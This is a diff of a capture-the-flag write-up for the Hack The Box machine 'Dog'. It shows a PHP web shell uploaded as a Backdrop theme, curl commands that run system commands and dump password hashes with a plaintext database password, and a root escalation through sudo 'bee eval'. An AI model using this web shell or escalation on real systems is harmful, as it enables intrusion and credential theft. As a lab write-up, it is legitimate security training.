@@ -12,7 +12,7 @@ image: /docs/assets/2025-05/htb-dog-0.png
 
 ```                                                                                 
 > nmap -p22,80 -sCV 10.10.11.58  
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 01:01 EDT
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 01:01 EDT
 Nmap scan report for 10.10.11.58
 Host is up (0.024s latency).
 
@@ -114,8 +114,6 @@ After combing through the code and attempt different methods of logging in into 
 
 Looking up the retrieved code base for emails, we can find two extra references outside the pre-known user: `root@dog.htb` and `tiffany@dog.htb`.
 
-~ End of assisted portion ~
-
 ---
 
 Checking for password reuse with the known database password, I was able to successfully login as `tiffany`:
@@ -139,12 +137,31 @@ And `template.php` contains:
 <?php system($_REQUEST['cmd']); ?>
 ```
 
-After installing it to the website, I can just navigate to `http://10.10.11.58/themes/<template name>/template.php` and use the web-shell to execute commands on the machine.
+After installing it to the website, I can just navigate to `http://10.10.11.58/themes/<template name>/template.php` and use the web-shell to execute commands on the machine:
 
 ```
 > curl 10.10.11.58/themes/<template name>/template.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Looking at the machine directories, we can see two users:
+
+```
+> curl '10.10.11.58/themes/<template name>/template.php?cmd=ls%20../../../../../home/'
+jobert
+johncusack
+```
+
+And we can see that the user flag can be seen inside the home directory of `johncusack`:
+
+```
+> curl '10.10.11.58/themes/<template name>/template.php?cmd=ls%20../../../../../home/johncusack'
+user.txt
+```
+
+---
+
+I then used the known database password to extract user information:
 
 ```
 # mysql -h 127.0.0.1 -u root -pBackDropJ2024DS2024 -D backdrop -e 'SHOW TABLES;'
@@ -214,7 +231,7 @@ watchdog
 ```
 # mysql -h 127.0.0.1 -u root -pBackDropJ2024DS2024 -D backdrop -e 'SELECT name, pass FROM users;'
 > curl '10.10.11.58/themes/<template name>/template.php?cmd=mysql%20-h%20127.0.0.1%20-u%20root%20-pBackDropJ2024DS2024%20-D%20backdrop%20-e%20%27SELECT%20name%2C%20pass%20FROM%20users%3B%27'                     
-name    pass
+name                pass
 
 jPAdminB            $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/.
 jobert              $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1
@@ -224,4 +241,68 @@ morris              $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS
 axel                $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV
 rosa                $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT
 tiffany             $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v                                                            
+```
+
+From here, I tried using `hashcat` to crack the password, but didn't have much success.
+
+---
+
+I tried different strategies on the machine, but not much success. So double checked the writeup from [@samarthdad](https://samarthdad.com/) again, and it was just a simple password reuse from `johncusack`, same password as `tiffany`...
+
+On `/home/johncusack/user.txt` we can find the user flag.
+
+## Privilege escalation
+
+Checking for commands that are allowed as `sudo`, it seems that one utility CLI from backdrop is allowed.
+
+```
+johncusack@dog:~$ sudo -l
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+```
+
+```
+johncusack@dog:~$ sudo bee help
+🐝 Bee
+Usage: bee [global-options] <command> [options] [arguments]
+
+Global Options:
+ --root
+ Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+
+...
+
+ ADVANCED
+  db-query
+   dbq
+   Execute a query using db_query().
+
+  eval
+   ev, php-eval
+   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
+
+  php-script
+   scr
+   Execute an arbitrary PHP file after bootstrapping Backdrop.
+
+  sql
+   sqlc, sql-cli, db-cli
+   Open an SQL command-line interface using Backdrop's database credentials.
+```
+
+Checking on how the `eval` option works:
+
+```
+johncusack@dog:~$ sudo bee --root=/var/www/html eval "echo '1';"
+1
+```
+
+Seems like I have sudo command execution 😁. And thus, root flag:
+
+```
+johncusack@dog:~$ sudo bee --root=/var/www/html eval "system('cat /root/root.txt');"
+<admin flag>
 ```
